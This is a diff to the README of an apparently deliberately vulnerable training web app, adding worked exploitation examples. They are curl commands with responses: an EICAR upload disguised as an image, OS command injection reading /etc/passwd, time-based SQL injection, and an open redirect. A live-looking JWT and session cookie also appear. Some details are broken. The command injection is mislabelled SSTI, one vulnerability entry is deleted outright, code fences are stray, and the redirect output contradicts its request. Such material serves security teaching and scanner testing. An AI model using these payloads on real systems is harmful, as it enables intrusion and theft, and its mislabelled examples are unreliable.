@@ -90,6 +90,43 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **DOM Cross-Site Scripting** - Open the landing page with the _dummy_ query param that contains DOM content (including script), add the provided DOM into the page, and execute it.
 
 - **File Upload** - The application allows uploading an avatar photo of the authenticated user. The server doesn't perform any sort of validation on the uploaded file.
+  <details>
+    <summary>Example of No Anti-Virus Protection</summary>
+
+    Uploading an EICAR test file with the file extension changed to "exe":
+
+    ```bash
+    curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \
+      -X PUT \
+      -H 'authorization: AUTH_TOKEN' \
+      -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
+      --data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
+    ```
+
+    The response indicates successful upload:
+
+    ```
+    HTTP/2 200 
+    ```
+
+    Successfully fetching the file shows that the server stored the file:
+    ```bash
+    $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI5NzkyOTJ9.NBfrHS7ydCltPBKDWuKbXvKJq901Q1cJHjyf3jhElJVAijuxNxOMCib-luiijXHHidIcgaHQrHF0ofcwBdaoZNfR244YEI0DalmruMd2xjumUJNy8jiofGgF0n-nwxp-CDdjN-xxV81oy7pscmHfYO07OyUWr1rqvPZYDejC1TGP8j1vlDeWkEB0gsE9NRb38DDwdkcjsy1UpLcidppVexUgCP60blghDTKYBEUFmfbFWNScN1BNSDvIhTIgXPX_GKuRueLayY15YtjCKRjqzjpTrTi80d5mf9nzoVIbo2RyjGRCg8LX7M1Zi7XRAhuZHV2JIMGqhXvWeFyN_BfQbxniZEcbP2SRUFhJChuZrf4JQeyhOQo_iPZb6xwJzHTY_Gd96jgGaMXgQLY933vI9s5Rc9TlpsVzPatESVK6ve1comR1k9xCeozEwpNY79kYjDIdFiUp8An0MSBYUbC-SvQWijB8wStogMyovWzJP83Lrpd77Oi5ZxK8onKBHMt8tKUkCZmFs8kAQLhkqq9QNiQVAhvnTJaIppy0kq0R-fBDeGWeMv3JLZbJUYea_mVmj3VhhlQ4PIJAhTTTTKTroKakfiCuDnzjIh3_voT2nrudCAP3tWsDgJRL6ViJNue4Xld2y2ASoMfgO52IAlr39Paxekq5nW-LHuZhsMxAMjY'
+    HTTP/2 200 
+    date: Wed, 26 Mar 2025 08:18:40 GMT
+    content-type: application/octet-stream
+    content-length: 68
+    x-xss-protection: 0
+    strict-transport-security: max-age=31536000; includeSubDomains
+    x-content-type-options: 1
+    content-security-policy: default-src  * 'unsafe-inline' 'unsafe-eval'
+    set-cookie: bc-calls-counter=1742977120812
+    set-cookie: connect.sid=lMiES0Dvw-Ry3lTj3y66OZz5E4yss82w.N8A90AIvE3tPkAoQfoah5KOb6PUIuw%2FqXA2Lf2HkCBU; Path=/
+
+    X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+    ```
+
+  </details>
 
 - **Full Path Disclosure** - All errors returned by the server include the full path of the file where the error has occurred. The errors can be triggered by passing wrong values as parameters or by modifying the bc-calls-counter cookie to a non-numeric value.
 
@@ -110,8 +147,39 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
 
 - **OS Command Injection** - The /api/spawn endpoint spawns a new process using the command in the _command_ query parameter. The endpoint is not referenced from UI.
+    <details>
+      <summary>Example Exploitation</summary>
 
-- **Remote File Inclusion (RFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
+      To demonstrate an SSTI attack, you can use the following `curl` command:
+
+      ```bash
+      $ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
+      ```
+
+      The response includes a result of code execution:
+
+      ```
+      Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024 x86_64 Linux
+      ```
+
+    </details>
+    <details>
+      <summary>Another Example Exploitation on graphQL</summary>
+
+      To demonstrate another SSTI attack, you can use the following `curl` command:
+
+      ```bash
+      curl -i -X POST -H Content-Type:application/json -H Accept:application/json 'https://brokencrystals.com/graphql' -d '{"query":"query ($getCommandResult_command: String!) { getCommandResult (command: $getCommandResult_command) }" ,"variables":{"getCommandResult_command":"/bin/cat /etc/passwd "}}'
+      ```
+
+      The response includes a result of code execution:
+
+      ```
+      {"data":{"getCommandResult":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/sh\n"}}%  
+      ```
+    </details>
+    ```
+
 
 - **Secret Tokens** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a Google API key.
 
@@ -141,8 +209,44 @@ Full configuration & usage examples can be found in our [demo project](https://g
   There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
 
 - **SQL injection (SQLi)** - The `/api/testimonials/count` endpoint receives and executes SQL query in the query parameter. Similarly, the `/api/products/views` endpoint utilizes the `x-product-name` header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
+  <details>
+    <summary>SQL Injection Example Exploitation</summary>
+
+    To demonstrate an SQL injection attack, you can use the following `curl` commands:
+
+    ```bash
+    $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
+    Total time: 5.687800 seconds
+    ```
+    This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.
+
+    ```bash
+    $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
+    Total time: 1.691999 seconds
+    ```
+    Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.
+
+    ```bash
+    $ curl https://brokencrystals.com/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
+    214
+    ```
+    This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.
+
+    ```
+  </details>
 
 - **Unvalidated Redirect** - The endpoint /api/goto redirects the client to the URL provided in the _url_ query parameter. The UI references the endpoint in the header (while clicking on the site's logo) and as a href source for the Terms and Services link in the footer.
+  <details>
+    <summary>Unvalidated Redirect Example Exploitation</summary>
+
+    To demonstrate an unvalidated redirect attack, you can use the following `curl` command:
+
+    ```bash
+    $ curl -I "https://qa.brokencrystals.com/api/goto?url=https://example.com"
+    HTTP/1.1 302 Found
+    Location: https://malicious-site.com
+    ```
+  </details>
 
 - **Version Control System** - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
 
